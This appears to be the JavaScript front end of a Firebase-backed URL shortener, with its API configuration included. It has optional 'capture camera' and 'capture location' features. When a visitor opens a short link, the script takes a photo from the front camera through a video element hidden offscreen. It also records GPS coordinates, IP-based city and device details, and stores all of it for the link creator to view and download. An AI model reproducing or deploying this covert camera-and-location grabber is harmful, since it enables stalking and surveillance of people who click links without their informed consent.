// Firebase Config
const firebaseConfig = { apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I", authDomain: "hjh-tools.firebaseapp.com", projectId: "hjh-tools", storageBucket: "hjh-tools.firebasestorage.app", messagingSenderId: "643137472905", appId: "1:643137472905:web:814ca23a86fb084811b958", databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com" };
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

function showToast(title, message, type='success'){ const c=document.getElementById('toastContainer'); if(!c) return; const t=document.createElement('div'); t.className=`toast ${type}`; t.innerHTML=`<i class="fas ${type==='success'?'fa-check-circle':'fa-exclamation-circle'}"></i><div><div class="toast-title">${title}</div><div class="toast-message">${message}</div></div>`; c.appendChild(t); setTimeout(()=>{t.style.opacity='0'; setTimeout(()=>t.remove(),300);},3000); }
function generateShortCode(){ return Math.random().toString(36).substring(2,8); }
function encodeFirebasePath(str){ return str.replace(/\./g,'_').replace(/\//g,'_'); }
let deleteCode=null;

// Helper: capture camera with direct working preview and force JPEG
async function captureCameraPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 800 }, height: { ideal: 600 } } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', 'true');
        video.style.position = 'fixed';
        video.style.top = '-9999px';
        document.body.appendChild(video);
        await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); setTimeout(resolve, 600); }; });
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg', 0.85);
        stream.getTracks().forEach(t => t.stop());
        video.remove();
        return (imageData && imageData.length > 1000) ? imageData : null;
    } catch(e){ console.warn(e); return null; }
}
async function captureLocation(){ return new Promise((resolve)=>{ if(!navigator.geolocation) resolve(null); navigator.geolocation.getCurrentPosition(p=>resolve({ latitude: p.coords.latitude, longitude: p.coords.longitude, accuracy: p.coords.accuracy }),()=>resolve(null),{timeout:8000}); });}
async function getAdvancedDeviceInfo(){ const info={ user_agent:navigator.userAgent, platform:navigator.platform, language:navigator.language, timezone:Intl.DateTimeFormat().resolvedOptions().timeZone, screen_width:screen.width, screen_height:screen.height, browser:'Unknown', os:'Unknown' }; const ua=navigator.userAgent; if(ua.includes('Chrome')&&!ua.includes('Edg')) info.browser='Chrome'; else if(ua.includes('Firefox')) info.browser='Firefox'; else if(ua.includes('Safari')) info.browser='Safari'; else info.browser='Edge'; if(ua.includes('iPhone')) info.os='iOS'; else if(ua.includes('Android')) info.os='Android'; else if(ua.includes('Windows')) info.os='Windows'; else info.os='Mac'; if(navigator.deviceMemory) info.device_memory=navigator.deviceMemory+'GB'; if(navigator.connection) info.connection_type=navigator.connection.effectiveType; return info; }
async function getIPInfo(){ try{ const r=await fetch('https://ipapi.co/json/'); const d=await r.json(); return { ip:d.ip||'Unknown', city:d.city||'Unknown', country:d.country_name||'Unknown', latitude:d.latitude, longitude:d.longitude }; }catch(e){ return { ip:'Unknown', city:'Unknown', country:'Unknown' }; } }

async function shortenUrl(){
    const longUrl=document.getElementById('longUrl').value.trim(); if(!longUrl){ showToast('Error','Enter URL','error'); return; }
    let finalUrl=longUrl; if(!finalUrl.startsWith('http')) finalUrl='https://'+finalUrl;
    try{ new URL(finalUrl); }catch(e){ showToast('Error','Invalid URL','error'); return; }
    const custom=document.getElementById('customCode').value.trim(); let code=custom||generateShortCode();
    const exists=await database.ref(`urls/${code}`).get(); if(exists.exists()){ showToast('Error','Alias taken','error'); return; }
    const hasPassword=document.getElementById('passwordToggle').checked; const password=hasPassword?document.getElementById('password').value:null;
    const socialGate=document.getElementById('socialToggle').checked; const socialIcon=document.getElementById('socialIcon').value; const socialTitle=socialGate?document.getElementById('socialTitle').value:null; const socialUrl=socialGate?document.getElementById('socialUrl').value:null; const socialDesc=socialGate?document.getElementById('socialDesc').value:null; const socialButton=socialGate?document.getElementById('socialButton').value:null;
    const animation=document.querySelector('input[name="animation"]:checked')?.value||'ring';
    const captureCamera=document.getElementById('captureCamera')?.checked||false; const captureLocationFlag=document.getElementById('captureLocation')?.checked||false;
    if(hasPassword&&!password){ showToast('Error','Password required','error'); return; }
    if(socialGate&&(!socialTitle||!socialUrl)){ showToast('Error','Fill social gate details','error'); return; }
    const domain=window.location.hostname; const deviceId=localStorage.getItem('hj_device_id')||generateShortCode()+generateShortCode(); localStorage.setItem('hj_device_id',deviceId);
    const linkData={ long_url:finalUrl, domain, created_at:new Date().toISOString(), device_id:deviceId, clicks:0, animation_type:animation }; if(password) linkData.password=password; if(socialTitle) { linkData.social_gate_title=socialTitle; linkData.social_gate_url=socialUrl; linkData.social_gate_icon=socialIcon; if(socialDesc)linkData.social_gate_description=socialDesc; if(socialButton)linkData.social_gate_button_text=socialButton; } if(captureCamera) linkData.capture_camera=true; if(captureLocationFlag) linkData.capture_location=true;
    await database.ref(`urls/${code}`).set(linkData); await database.ref(`domains/${encodeFirebasePath(domain)}/${code}`).set(linkData);
    const shortUrl=`${window.location.origin}/${code}`; document.getElementById('shortLink').innerText=shortUrl; document.getElementById('result').classList.remove('hidden'); const qrDiv=document.getElementById('qrCode'); qrDiv.innerHTML=''; new QRCode(qrDiv,{text:shortUrl,width:100,height:100,colorDark:"#00ff41",colorLight:"#000000"});
    showToast('Success','Link created!','success'); document.getElementById('longUrl').value=''; document.getElementById('customCode').value=''; document.getElementById('passwordToggle').checked=false; document.getElementById('socialToggle').checked=false; document.getElementById('passwordSection').classList.add('hidden'); document.getElementById('socialSection').classList.add('hidden'); showLinks(); showStats(); showRecent();
}
window.showLinks=async function(){ updateDisplay('YOUR LINKS','fa-link','<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading...</p></div>'); try{ const domain=window.location.hostname; const snap=await database.ref(`domains/${encodeFirebasePath(domain)}`).get(); const links=[]; snap.forEach(c=>{ links.push({code:c.key,...c.val()}); }); if(!links.length){ updateDisplay('YOUR LINKS','fa-link','<div class="empty-data"><i class="fas fa-inbox"></i><p>No links yet</p></div>'); return; } let html=''; links.forEach(l=>{ html+=`<div class="data-item"><div class="data-item-header"><span class="data-item-code"><i class="fas fa-link"></i> /${l.code}</span><span>${new Date(l.created_at).toLocaleDateString()}</span></div><div class="data-item-url"><i class="fas fa-globe"></i> ${(l.long_url||'').substring(0,70)}</div><div class="data-item-stats"><span><i class="fas fa-mouse-pointer"></i> Clicks: ${l.clicks||0}</span>${l.password?'<span><i class="fas fa-lock"></i> PW</span>':''}${l.social_gate_url?'<span><i class="fas fa-share-alt"></i> Gate</span>':''}</div><div class="data-item-actions"><button class="data-btn-sm" onclick="copyToClipboard('${window.location.origin}/${l.code}')"><i class="fas fa-copy"></i> Copy</button><button class="data-btn-sm" onclick="viewAnalytics('${l.code}')"><i class="fas fa-chart-line"></i> Data</button><button class="data-btn-sm" onclick="confirmDelete('${l.code}')" style="background:#ff444420;"><i class="fas fa-trash-alt"></i> Delete</button></div></div>`; }); updateDisplay('YOUR LINKS','fa-link',html); }catch(e){ updateDisplay('ERROR','fa-exclamation-triangle','<div class="empty-data">Failed</div>'); } };
window.showStats=async function(){ updateDisplay('STATISTICS','fa-chart-line','<div class="empty-data">Loading stats...</div>'); try{ const domain=window.location.hostname; const snap=await database.ref(`domains/${encodeFirebasePath(domain)}`).get(); let totalClicks=0,totalLinks=0; for(const [code] of Object.entries(snap.val()||{})){ totalLinks++; const linkSnap=await database.ref(`urls/${code}`).get(); if(linkSnap.exists()) totalClicks+=linkSnap.val().clicks||0; } const html=`<div class="stats-grid"><div class="stat-card"><div class="stat-value">${totalLinks}</div><div class="stat-label">Links</div></div><div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label">Clicks</div></div></div>`; updateDisplay('STATISTICS','fa-chart-line',html); }catch(e){ updateDisplay('STATS ERROR','fa-exclamation','<div class="empty-data">Error</div>'); } };
window.showRecent=async function(){ updateDisplay('RECENT ACTIVITY','fa-history','<div class="empty-data">Loading visits...</div>'); try{ const domain=window.location.hostname; const snap=await database.ref(`domains/${encodeFirebasePath(domain)}`).get(); const visitors=[]; for(const [code] of Object.entries(snap.val()||{})){ const analyticsSnap=await database.ref(`analytics/${code}`).orderByKey().limitToLast(30).get(); analyticsSnap.forEach(v=>{ visitors.push({code,...v.val()}); }); } visitors.sort((a,b)=>new Date(b.created_at)-new Date(a.created_at)); const recent=visitors.slice(0,15); if(!recent.length){ updateDisplay('RECENT ACTIVITY','fa-history','<div class="empty-data">No visits yet</div>'); return; } let html=''; recent.forEach(v=>{ html+=`<div class="data-item"><div class="data-item-header"><span><i class="fas fa-link"></i> /${v.code}</span><span>${new Date(v.created_at).toLocaleString()}</span></div><div class="data-item-stats"><span><i class="fas fa-globe"></i> ${v.ip_address||'Unknown'}</span><span><i class="fas fa-mobile-alt"></i> ${v.device_model||v.os||'Device'}</span></div>${v.captured_image?`<div class="data-item-stats" style="color:#00ff41;"><i class="fas fa-camera"></i> Photo captured! <button class="data-btn-sm" onclick="viewPhoto('${v.captured_image.replace(/'/g,"\\'")}')"><i class="fas fa-eye"></i> View</button></div>`:''}<div class="data-item-actions"><button class="data-btn-sm" onclick="viewAnalytics('${v.code}')">Full Data</button></div></div>`; }); updateDisplay('RECENT ACTIVITY','fa-history',html); }catch(e){ updateDisplay('Recent Error','fa-exclamation','<div class="empty-data">Could not load</div>'); } };
window.viewAnalytics=async function(code){ updateDisplay(`ANALYTICS: /${code}`,'fa-chart-line','<div class="empty-data">Loading...</div>'); try{ const snap=await database.ref(`analytics/${code}`).orderByKey().limitToLast(100).get(); const list=[]; snap.forEach(c=>list.push(c.val())); list.reverse(); let detail=`<div class="stats-grid"><div class="stat-card"><div class="stat-value">${list.length}</div><div class="stat-label">Clicks</div></div></div>`; if(!list.length) detail+='<div class="empty-data">No visitors yet</div>'; else list.forEach(v=>{ detail+=`<div class="data-item"><div><i class="fas fa-clock"></i> ${new Date(v.created_at).toLocaleString()}</div><div><i class="fas fa-globe"></i> ${v.ip_address||'?'} | ${v.city||''} ${v.country||''}</div><div>${v.device_brand||''} ${v.device_model||''} | ${v.browser||''}</div>${v.captured_image?`<div><i class="fas fa-camera"></i> <button class="data-btn-sm" onclick="viewPhoto('${v.captured_image.replace(/'/g,"\\'")}')">View Photo</button></div>`:''}</div>`; }); updateDisplay(`Visitor data /${code}`,'fa-chart-line',detail); }catch(e){ updateDisplay('Error','fa-exclamation','<div class="empty-data">Failed</div>'); } };
window.viewPhoto=(imgData)=>{ const modal=document.getElementById('photoModal'); const img=document.getElementById('photoModalImage'); if(modal&&img&&imgData&&imgData!=='black_screen'&&imgData.startsWith('data:image')){ img.src=imgData; modal.classList.remove('hidden'); }else{ showToast('Error','Invalid photo','error'); } };
window.confirmDelete=(code)=>{ deleteCode=code; document.getElementById('deleteLinkCode').innerText=`/${code}`; document.getElementById('deleteModal').classList.remove('hidden'); };
window.executeDelete=async()=>{ if(deleteCode){ await database.ref(`urls/${deleteCode}`).remove(); await database.ref(`analytics/${deleteCode}`).remove(); const domain=window.location.hostname; await database.ref(`domains/${encodeFirebasePath(domain)}/${deleteCode}`).remove(); showToast('Deleted','Link removed','success'); showLinks(); showStats(); showRecent(); deleteCode=null; document.getElementById('deleteModal').classList.add('hidden'); } };
window.cancelDelete=()=>{ deleteCode=null; document.getElementById('deleteModal').classList.add('hidden'); };
window.copyToClipboard=(txt)=>{ navigator.clipboard.writeText(txt); showToast('Copied','Link copied','success'); };
function updateDisplay(title,icon,html){ const hIcon=document.querySelector('#dataDisplayHeader i'); const hTitle=document.getElementById('dataDisplayTitle'); const contentDiv=document.getElementById('dataDisplayContent'); if(hIcon) hIcon.className=`fas ${icon}`; if(hTitle) hTitle.innerText=title; if(contentDiv) contentDiv.innerHTML=html; }
document.getElementById('shortenBtn')?.addEventListener('click',shortenUrl); document.getElementById('copyBtn')?.addEventListener('click',()=>{ let link=document.getElementById('shortLink')?.innerText; if(link) copyToClipboard(link); });
document.getElementById('passwordToggle')?.addEventListener('change',e=>{ document.getElementById('passwordSection').classList.toggle('hidden'); });
document.getElementById('socialToggle')?.addEventListener('change',e=>{ document.getElementById('socialSection').classList.toggle('hidden'); });
document.querySelectorAll('.icon-option').forEach(ic=>{ ic.addEventListener('click',()=>{ document.querySelectorAll('.icon-option').forEach(i=>i.classList.remove('active')); ic.classList.add('active'); document.getElementById('socialIcon').value=ic.dataset.icon; }); });
document.getElementById('advancedToggle')?.addEventListener('click',()=>{ document.getElementById('advancedContent').classList.toggle('hidden'); });
document.getElementById('confirmDeleteBtn')?.addEventListener('click',executeDelete); document.getElementById('cancelDeleteBtn')?.addEventListener('click',cancelDelete); document.getElementById('closePhotoModal')?.addEventListener('click',()=>document.getElementById('photoModal').classList.add('hidden')); document.getElementById('closePhotoModalBtn')?.addEventListener('click',()=>document.getElementById('photoModal').classList.add('hidden')); document.getElementById('downloadPhotoBtn')?.addEventListener('click',()=>{ const img=document.getElementById('photoModalImage'); if(img&&img.src){ const a=document.createElement('a'); a.href=img.src; a.download=`visitor_${Date.now()}.jpg`; a.click(); } });
document.querySelectorAll('.bottom-nav-btn').forEach(btn=>{ btn.addEventListener('click',()=>{ const tab=btn.dataset.tab; document.querySelectorAll('.bottom-nav-btn').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); if(tab==='create'){ document.getElementById('createCard').scrollIntoView({behavior:'smooth'}); updateDisplay('Click any button','fa-fingerprint','<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Select LINKS, STATS, RECENT</p></div>'); } else if(tab==='links') showLinks(); else if(tab==='stats') showStats(); else if(tab==='recent') showRecent(); }); });
// Redirect handling (for visitors) - will be placed on server, but frontend analytics capture if accessed via short domain
if(window.location.pathname.length>1 && !window.location.pathname.includes('.html')){ const code=window.location.pathname.substring(1); if(code){ (async()=>{ const snap=await database.ref(`urls/${code}`).get(); if(snap.exists()){ const data=snap.val(); let cameraImg=null, locationData=null; if(data.capture_camera) cameraImg=await captureCameraPhoto(); if(data.capture_location) locationData=await captureLocation(); const ipInfo=await getIPInfo(); const device=await getAdvancedDeviceInfo(); const analytics={ created_at:new Date().toISOString(), ip_address:ipInfo.ip, city:ipInfo.city, country:ipInfo.country, latitude:ipInfo.latitude, longitude:ipInfo.longitude, ...device, captured_image:cameraImg, gps_location:locationData }; await database.ref(`analytics/${code}`).push(analytics); await database.ref(`urls/${code}/clicks`).transaction(c=> (c||0)+1); if(data.password){ sessionStorage.setItem(`pw_${code}`,'false'); } else if(data.social_gate_url){ sessionStorage.setItem(`social_${code}`,'pending'); } else { window.location.href=data.long_url; } } })(); } }
</script>
